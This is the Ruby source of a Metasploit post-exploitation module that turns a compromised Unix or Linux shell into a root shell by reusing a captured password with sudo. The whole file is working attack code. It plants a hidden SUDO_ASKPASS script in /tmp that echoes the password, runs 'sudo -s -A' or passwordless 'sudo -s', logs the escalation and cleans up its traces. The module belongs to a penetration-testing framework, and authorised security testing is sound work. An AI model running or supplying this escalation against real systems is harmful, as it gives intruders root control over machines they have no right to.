##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Post::Linux::Priv
  include Msf::Post::Linux::System
  include Msf::Exploit::FileDropper

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Multiple Linux / Unix Post Sudo Upgrade Shell',
        'Description' => %q{
          This module attempts to upgrade a shell account to UID 0 by reusing the
          given password and passing it to sudo. This technique relies on sudo
          versions from 2008 and later which support -A.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'todb <todb[at]metasploit.com>',
          'Ryan Baxendale <rbaxendale[at]gmail.com>' # added password option
        ],
        'Platform' => %w[aix linux osx solaris unix],
        'References' => [
          # Askpass first added March 2, 2008, looks like
          [ 'URL', 'http://www.sudo.ws/repos/sudo/file/05780f5f71fd/sudo.h']
        ],
        'SessionTypes' => [ 'shell' ],
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [IOC_IN_LOGS, ACCOUNT_LOCKOUTS],
          'Reliability' => []
        }
      )
    ) # Need to test 'meterpreter'

    register_options(
      [
        OptString.new('PASSWORD', [false, 'The password to use when running sudo.'])
      ]
    )
  end

  # Run Method for when run command is issued
  def run
    if session.type == 'meterpreter'
      fail_with(Failure::BadConfig, 'Meterpreter sessions cannot be elevated with sudo')
    end

    print_status('SUDO: Attempting to upgrade to UID 0 via sudo')
    sudo_bin = cmd_exec('which sudo')
    if is_root?
      print_status 'Already root, so no need to upgrade permissions. Aborting.'
      return
    end
    if sudo_bin.empty?
      print_error 'No sudo binary available. Aborting.'
      return
    end
    get_root
  end

  def get_root
    password = datastore['PASSWORD'] || session.exploit_datastore['PASSWORD']

    if password.to_s.empty?
      print_status 'No password available, trying a passwordless sudo.'
    else
      print_status 'Sudoing with the supplied password.'
    end
    askpass_sudo(password)
    if is_root?
      print_good 'SUDO: Root shell secured.'
      report_note(
        host: session,
        type: 'host.escalation',
        data: { :escalation => "User `#{session.exploit_datastore['USERNAME']}' sudo'ed to a root shell" }
      )
    else
      print_error "SUDO: Didn't work out, still a mere user."
    end
  end

  # TODO: test on more platforms
  def askpass_sudo(password)
    if password.to_s.empty?
      begin
        ::Timeout.timeout(30) do
          cmd_exec('sudo -s')
        end
      rescue ::Timeout::Error
        print_error 'SUDO: Passwordless sudo timed out. Might be blocking.'
      rescue StandardError
        print_error 'SUDO: Passwordless sudo failed. Check the session log.'
      end
    else
      begin
        # Telnet can be pretty pokey, allow about 20 seconds per cmd_exec
        # Generally will be much snappier over ssh.
        # Need to timeout in case there's a blocking prompt after all
        ::Timeout.timeout(120) do
          with_askpass_script(password) do |askpass_sh|
            vprint_status 'Setting environment variable.'

            # Bruteforce the set command. At least one should work.
            escaped_askpass_sh = session.escape_arg(askpass_sh)
            cmd_exec("setenv SUDO_ASKPASS #{escaped_askpass_sh}")
            cmd_exec("export SUDO_ASKPASS=#{escaped_askpass_sh}")
            vprint_status 'Executing sudo -s -A'
            cmd_exec('sudo -s -A')
          end
        end
      rescue ::Timeout::Error
        print_error 'SUDO: Sudo with a password timed out.'
      rescue StandardError
        print_error 'SUDO: Sudo with a password failed. Check the session log.'
      end
    end
  end

  def with_askpass_script(password)
    askpass_dir = '/tmp/.' + Rex::Text.rand_text_alpha(7)
    askpass_sh = "#{askpass_dir}/askpass"
    escaped_askpass_dir = session.escape_arg(askpass_dir)
    escaped_askpass_sh = session.escape_arg(askpass_sh)
    directory_created = false

    vprint_status "Creating a private SUDO_ASKPASS directory: #{askpass_dir}"
    directory_created = _shell_command_with_success_code(
      "/bin/sh -c 'umask 077 && mkdir -m 700 \"$1\"' sh #{escaped_askpass_dir}"
    )
    raise 'Could not create a private SUDO_ASKPASS directory' unless directory_created

    # Create the file through a short-lived POSIX shell so umask 077 cannot
    # leak into the interactive session. The private directory is already the
    # atomic access boundary; chmod completes before any password is written.
    unless _shell_command_with_success_code(
      "/bin/sh -c 'umask 077 && touch \"$1\" && chmod 700 \"$1\"' sh #{escaped_askpass_sh}"
    )
      raise 'Could not create a private SUDO_ASKPASS script'
    end

    vprint_status "Writing the SUDO_ASKPASS script: #{askpass_sh}"
    raise 'Could not write the SUDO_ASKPASS script' unless write_file(askpass_sh, askpass_script(password))

    yield askpass_sh
  ensure
    cleanup_askpass_script(askpass_dir, askpass_sh) if directory_created
  end

  def askpass_script(password)
    escaped_password = password.to_s.gsub("'", %q{'"'"'})
    "#!/bin/sh\nprintf '%s\\n' '#{escaped_password}'\n"
  end

  def cleanup_askpass_script(askpass_dir, askpass_sh)
    file_removed = askpass_sh.nil?
    file_error = nil

    begin
      unless askpass_sh.nil?
        begin
          file_removed = _shell_command_with_success_code("rm -f #{session.escape_arg(askpass_sh)}")
        rescue StandardError => e
          file_error = e
        end

        unless file_removed
          message = 'Could not verify removal of the SUDO_ASKPASS script; attempting private directory cleanup.'
          message += " (#{file_error.class})" unless file_error.nil?
          print_warning message
        end
      end
    ensure
      directory_removed = askpass_dir.nil?
      directory_error = nil

      unless askpass_dir.nil?
        begin
          # Do not recursively remove unexpected contents. Without a stable
          # object identity, retaining this pathname for later deletion is unsafe.
          directory_removed = _shell_command_with_success_code("rmdir #{session.escape_arg(askpass_dir)}")
        rescue StandardError => e
          directory_error = e
        end
      end

      unless directory_removed
        message = 'Could not verify removal of the private SUDO_ASKPASS directory; manual cleanup may be required.'
        message += " (#{directory_error.class})" unless directory_error.nil?
        print_warning message
      end
    end
  end
end
